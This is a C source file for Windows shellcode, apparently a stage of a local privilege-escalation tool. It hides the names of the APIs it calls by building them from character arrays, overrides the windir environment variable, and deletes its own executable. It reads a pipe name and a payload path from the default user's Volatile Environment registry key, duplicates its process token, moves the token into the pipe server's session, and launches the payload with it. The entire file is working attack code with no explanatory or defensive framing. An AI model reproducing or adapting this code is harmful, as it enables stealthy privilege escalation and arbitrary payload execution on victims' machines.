#include "shellcode_common.h"

/* Registry types/constants not available in freestanding build */
typedef unsigned long REGSAM;
typedef long LSTATUS;
#ifndef HKEY_USERS
#define HKEY_USERS ((HKEY)0x80000003UL)
#endif
#ifndef KEY_READ
#define KEY_READ (0x20019)
#endif
#ifndef REG_SZ
#define REG_SZ 1UL
#endif
#ifndef FILE_FLAG_DELETE_ON_CLOSE
#define FILE_FLAG_DELETE_ON_CLOSE 0x04000000
#endif
#ifndef DELETE
#define DELETE (0x00010000L)
#endif

typedef BOOL(WINAPI *pSetEnvironmentVariableW)(LPCWSTR, LPCWSTR);
typedef HANDLE(WINAPI *pCreateFileW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL(WINAPI *pCloseHandle)(HANDLE);
typedef DWORD(WINAPI *pGetModuleFileNameW)(HMODULE, LPWSTR, DWORD);
typedef BOOL(WINAPI *pGetNamedPipeServerSessionId)(HANDLE, PULONG);
typedef BOOL(WINAPI *pOpenProcessToken)(HANDLE, DWORD, PHANDLE);
typedef HANDLE(WINAPI *pGetCurrentProcess)(void);
typedef BOOL(WINAPI *pDuplicateTokenEx)(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
typedef BOOL(WINAPI *pCreateProcessAsUserW)(HANDLE, LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
typedef VOID(WINAPI *pRtlZeroMemory)(PVOID, SIZE_T);
typedef LSTATUS(WINAPI *pRegOpenKeyExW)(HKEY, LPCWSTR, DWORD, REGSAM, HKEY *);
typedef LSTATUS(WINAPI *pRegQueryValueExW)(HKEY, LPCWSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
typedef LSTATUS(WINAPI *pRegCloseKey)(HKEY);

FUNC int start(void) {
  int _fail = 0;
  MODNAME_K32;
  PVOID hK32 = GET_MODULE_K32;
  if (!hK32) return 1;
  MODNAME_A32;
  PVOID hAdv32 = GET_MODULE_A32;
  if (!hAdv32) return 1;

  pSetEnvironmentVariableW SetEnvironmentVariableW;
  pCreateFileW CreateFileW;
  pCloseHandle CloseHandle;
  pGetModuleFileNameW GetModuleFileNameW;
  pGetNamedPipeServerSessionId GetNamedPipeServerSessionId;
  pGetCurrentProcess GetCurrentProcess;
  pRtlZeroMemory RtlZeroMemory;
  pOpenProcessToken OpenProcessToken;
  pDuplicateTokenEx DuplicateTokenEx;
  pCreateProcessAsUserW CreateProcessAsUserW;
  pRegOpenKeyExW RegOpenKeyExW;
  pRegQueryValueExW RegQueryValueExW;
  pRegCloseKey RegCloseKey;

  {
    char _fn[] = { 'S','e','t','E','n','v','i','r','o','n','m','e','n','t','V','a','r','i','a','b','l','e','W','\0' };
    *(PVOID *)&SetEnvironmentVariableW = _GetProcAddress(hK32, _fn);
    if (!SetEnvironmentVariableW) return 1;
  }
  {
    char _fn[] = { 'C','r','e','a','t','e','F','i','l','e','W','\0' };
    *(PVOID *)&CreateFileW = _GetProcAddress(hK32, _fn);
    if (!CreateFileW) return 1;
  }
  {
    char _fn[] = { 'C','l','o','s','e','H','a','n','d','l','e','\0' };
    *(PVOID *)&CloseHandle = _GetProcAddress(hK32, _fn);
    if (!CloseHandle) return 1;
  }
  {
    char _fn[] = { 'G','e','t','M','o','d','u','l','e','F','i','l','e','N','a','m','e','W','\0' };
    *(PVOID *)&GetModuleFileNameW = _GetProcAddress(hK32, _fn);
    if (!GetModuleFileNameW) return 1;
  }
  {
    char _fn[] = { 'G','e','t','N','a','m','e','d','P','i','p','e','S','e','r','v','e','r','S','e','s','s','i','o','n','I','d','\0' };
    *(PVOID *)&GetNamedPipeServerSessionId = _GetProcAddress(hK32, _fn);
    if (!GetNamedPipeServerSessionId) return 1;
  }
  {
    char _fn[] = { 'G','e','t','C','u','r','r','e','n','t','P','r','o','c','e','s','s','\0' };
    *(PVOID *)&GetCurrentProcess = _GetProcAddress(hK32, _fn);
    if (!GetCurrentProcess) return 1;
  }
  {
    char _fn[] = { 'R','t','l','Z','e','r','o','M','e','m','o','r','y','\0' };
    *(PVOID *)&RtlZeroMemory = _GetProcAddress(hK32, _fn);
    if (!RtlZeroMemory) return 1;
  }
  {
    char _fn[] = { 'O','p','e','n','P','r','o','c','e','s','s','T','o','k','e','n','\0' };
    *(PVOID *)&OpenProcessToken = _GetProcAddress(hAdv32, _fn);
    if (!OpenProcessToken) return 1;
  }
  {
    char _fn[] = { 'D','u','p','l','i','c','a','t','e','T','o','k','e','n','E','x','\0' };
    *(PVOID *)&DuplicateTokenEx = _GetProcAddress(hAdv32, _fn);
    if (!DuplicateTokenEx) return 1;
  }
  {
    char _fn[] = { 'C','r','e','a','t','e','P','r','o','c','e','s','s','A','s','U','s','e','r','W','\0' };
    *(PVOID *)&CreateProcessAsUserW = _GetProcAddress(hAdv32, _fn);
    if (!CreateProcessAsUserW) return 1;
  }
  {
    char _fn[] = { 'R','e','g','O','p','e','n','K','e','y','E','x','W','\0' };
    *(PVOID *)&RegOpenKeyExW = _GetProcAddress(hAdv32, _fn);
    if (!RegOpenKeyExW) return 1;
  }
  {
    char _fn[] = { 'R','e','g','Q','u','e','r','y','V','a','l','u','e','E','x','W','\0' };
    *(PVOID *)&RegQueryValueExW = _GetProcAddress(hAdv32, _fn);
    if (!RegQueryValueExW) return 1;
  }
  {
    char _fn[] = { 'R','e','g','C','l','o','s','e','K','e','y','\0' };
    *(PVOID *)&RegCloseKey = _GetProcAddress(hAdv32, _fn);
    if (!RegCloseKey) return 1;
  }

  WCHAR windir[] = { L'w',L'i',L'n',L'd',L'i',L'r',L'\0' };
  WCHAR winpath[] = { L'C',L':',L'\\',L'W',L'i',L'n',L'd',L'o',L'w',L's',L'\0' };
  ALIGN_STACK();
  SetEnvironmentVariableW(windir, winpath);

  WCHAR selfPath[260];
  GetModuleFileNameW(NULL, selfPath, 260);
  HANDLE hSelf = CreateFileW(selfPath, DELETE,
      FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
      NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
  if (hSelf != INVALID_HANDLE_VALUE) CloseHandle(hSelf);

  WCHAR veKey[] = { L'.',L'D',L'E',L'F',L'A',L'U',L'L',L'T',L'\\',
                    L'V',L'o',L'l',L'a',L't',L'i',L'l',L'e',L' ',
                    L'E',L'n',L'v',L'i',L'r',L'o',L'n',L'm',L'e',L'n',L't',L'\0' };
  HKEY hKey;
  ALIGN_STACK();
  if (RegOpenKeyExW(HKEY_USERS, veKey, 0, KEY_READ, &hKey) != 0) return 1;

  WCHAR mpPipe[] = { L'm',L'p',L'_',L'p',L'i',L'p',L'e',L'\0' };
  WCHAR pipeName[64];
  DWORD type, size = sizeof(pipeName);
  ALIGN_STACK();
  if (RegQueryValueExW(hKey, mpPipe, NULL, &type,
                       (LPBYTE)pipeName, &size) != 0) {
    RegCloseKey(hKey); return 1;
  }

  WCHAR mpPayload[] = { L'm',L'p',L'_',L'p',L'a',L'y',L'l',L'o',
                        L'a',L'd',L'\0' };
  WCHAR payloadPath[260];
  size = sizeof(payloadPath);
  ALIGN_STACK();
  if (RegQueryValueExW(hKey, mpPayload, NULL, &type,
                       (LPBYTE)payloadPath, &size) != 0) {
    RegCloseKey(hKey); return 1;
  }
  RegCloseKey(hKey);

  ALIGN_STACK();
  HANDLE hPipe = CreateFileW(pipeName, GENERIC_READ | GENERIC_WRITE, 0,
                             NULL, OPEN_EXISTING, 0, NULL);
  if (hPipe == INVALID_HANDLE_VALUE) return 1;

  ULONG sessionId;
  ALIGN_STACK();
  if (!GetNamedPipeServerSessionId(hPipe, &sessionId)) {
    CloseHandle(hPipe);
    return 1;
  }
  CloseHandle(hPipe);

  HANDLE hToken;
  ALIGN_STACK();
  if (!OpenProcessToken(GetCurrentProcess(),
                        TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT,
                        &hToken)) return 1;

  HANDLE hNewToken;
  ALIGN_STACK();
  if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation,
                        TokenPrimary, &hNewToken)) {
    CloseHandle(hToken);
    return 1;
  }
  CloseHandle(hToken);

  MODNAME_NTDLL;
  PVOID hNtdll = GET_MODULE_NTDLL;
  if (hNtdll) {
    typedef NTSTATUS(NTAPI *pNtSetInformationToken)(HANDLE, int, PVOID, ULONG);
    pNtSetInformationToken NtSetInformationToken;
    char _fn[] = { 'N','t','S','e','t','I','n','f','o','r','m','a','t','i','o','n','T','o','k','e','n','\0' };
    *(PVOID *)&NtSetInformationToken = _GetProcAddress(hNtdll, _fn);
    if (NtSetInformationToken)
      NtSetInformationToken(hNewToken, 12, &sessionId, sizeof(ULONG));
  }

  STARTUPINFOW si;
  PROCESS_INFORMATION pi;
  RtlZeroMemory(&si, sizeof(si));
  si.cb = sizeof(STARTUPINFOW);

  ALIGN_STACK();
  CreateProcessAsUserW(hNewToken, payloadPath, NULL, NULL, NULL, FALSE, 0,
                       NULL, NULL, &si, &pi);

  CloseHandle(pi.hProcess);
  CloseHandle(pi.hThread);
  CloseHandle(hNewToken);
  return 0;
}
